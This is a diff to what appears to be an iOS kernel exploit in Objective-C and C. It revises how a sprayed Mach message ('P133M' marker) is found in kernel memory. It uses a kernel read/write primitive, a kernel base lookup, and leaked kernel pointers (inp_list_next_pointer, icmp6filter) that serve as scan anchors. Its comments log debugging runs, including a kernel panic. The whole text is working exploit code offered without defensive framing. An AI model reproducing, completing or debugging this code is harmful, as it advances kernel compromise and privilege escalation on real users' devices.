@@ -16,7 +16,7 @@
 #define P113_HAS_CS2CORE 1
 #endif
 
-#define P113_BUILD @"p113-descforge-control-v3"
+#define P113_BUILD @"p113-descforge-v4"
 #define P113_MAGIC 0x50313333u   /* "P133" marker in body */
 #define P113_NDESC 16u
 
@@ -140,7 +140,7 @@ static NSString *P113Ret(void) {
                    O_CREAT | O_WRONLY | O_TRUNC, 0644);
     p113_log(@"=== p113 session build=%@ ===", P113_BUILD);
     if (!p113_krw()) { if (p113_fd>=0){close(p113_fd);p113_fd=-1;} return g_buf0(); }
-    uint64_t kb = 0; if (g_kb(&kb)) p113_log(@"kbase=0x%llx", kb);
+    uint64_t kb = 0; if (g_kb(&kb) == 0) p113_log(@"kbase=0x%llx", kb);   /* v4: kbase returns 0 = success — the inverted-BARL form hid every successful lookup */
 
     /* exact complex size: hdr + body + 16 descs + body{marker5,pad3,tag4} */
     const uint32_t sz = (uint32_t)(sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + P113_NDESC * 12 + 12);
@@ -151,25 +151,50 @@ static NSString *P113Ret(void) {
                                 MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     p113_log(@"send kr=%u", kr);
 
-    /* kernel-scan for the marker 'P133M' + tag — content signature law */
+    /* v4 SCAN FIX (three dead laws, found from the 2026-10-25 19:3x mini run
+       "send kr=0 → end with no scan lines"):
+       (1) g_kb returns 0 = success (kern convention) but the caller read it as
+           a BOOL — successful lookups RETURNED EARLY; the scan only ever ran
+           when the kbase lookup FAILED.
+       (2) vm_read_overwrite on kernel VAs cannot succeed from a userspace task
+           — the scan was dead text in every build that reached it.
+       (3) the marker hunt stopped scanning the static region: the 19:35-min
+           census panic proved kbase-relative static offsets unmapped, and the
+           kmsg kdata lives in the kernel KALLOC zones anyway. Anchor law (=
+           P123 v3): kernel VAs the cs2 core read this boot, ±0x200000 windows. */
     uint64_t found = 0;
     {
-        uint64_t kb2 = 0; if (!g_kb(&kb2)) return ane_none();
-        const uint64_t band = kb2 + 0x4000000ULL;
-        static const uint64_t win = 0x200000ULL;
+        uint64_t kb2 = 0; if (g_kb(&kb2) != 0) return ane_none();
+        uint64_t anchors[2] = { 0, 0 };
+        NSString *docsA = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+        NSMutableString *llA = [[NSMutableString alloc] initWithContentsOfFile:[docsA stringByAppendingPathComponent:@"cs2_core_log.txt"] encoding:NSUTF8StringEncoding error:nil] ?: [NSMutableString string];
+#ifdef P113_HAS_CS2CORE
+        [llA appendFormat:@" %@", (Lum1naCS2Core_LastLog() ?: @"")];
+#endif
+        NSScanner *scA = [NSScanner scannerWithString:llA];
+        if ([scA scanUpToString:@"inp_list_next_pointer: 0x" intoString:NULL] &&
+            [scA scanString:@"inp_list_next_pointer: 0x" intoString:NULL] &&
+            [scA scanHexUnsignedLongLong:&anchors[0]] && anchors[0] >= 0xfffff00000000000ULL) {
+            p113_log(@"[v4] anchor inp-list-next = 0x%llx", anchors[0]);
+        } else { anchors[0] = 0; }
+        scA = [NSScanner scannerWithString:llA];
+        if ([scA scanUpToString:@"icmp6filter: 0x" intoString:NULL] &&
+            [scA scanString:@"icmp6filter: 0x" intoString:NULL] &&
+            [scA scanHexUnsignedLongLong:&anchors[1]] && anchors[1] >= 0xfffff00000000000ULL) {
+            p113_log(@"[v4] anchor icmp6filter = 0x%llx", anchors[1]);
+        } else { anchors[1] = 0; }
         uint8_t *rb = malloc(0x4000);
-        for (uint64_t q = 0; q < win && !found; q += 0x4000) {
-            uint64_t a = band + q; uint64_t got = 0;
-            vm_size_t vsz = 0x4000;
-            kern_return_t vr = vm_read_overwrite(mach_task_self(), (vm_address_t)(uintptr_t)a,
-                0x4000, (vm_address_t)(uintptr_t)rb, &vsz);
-            if (vr != KERN_SUCCESS) continue;
-            for (uint32_t i = 0; i + 16 <= 0x4000; i += 4)
-                if (memcmp(rb + i, "P133M", 5) == 0) { found = a + i; break; }
+        for (int ai = 0; ai < 2 && !found; ai++) {
+            if (!anchors[ai]) continue;
+            for (uint64_t a = (anchors[ai] - 0x200000) & ~0x3fffULL; a + 0x4000 <= anchors[ai] + 0x200000 && !found; a += 0x4000) {
+                if (g_rd(a, rb, 0x4000) != 0) continue;
+                for (uint32_t i2 = 0; i2 + 16 <= 0x4000; i2 += 4)
+                    if (memcmp(rb + i2, "P133M", 5) == 0) { found = a + i2; break; }
+            }
         }
         free(rb);
+        if (!found) p113_log(@"[-] marker not found in the anchor windows (zone-class scan, honest miss — widen or add anchors)");
     }
-    if (!found) { p113_log(@"[-] marker not found in scan band — widen or scan different band"); }
     else {
         p113_log(@"[+] kmsg kdata @0x%llx (marker 'P133M' found)", found);
         /* v2: dump the kernel desc area BEFORE touching it — learns the live
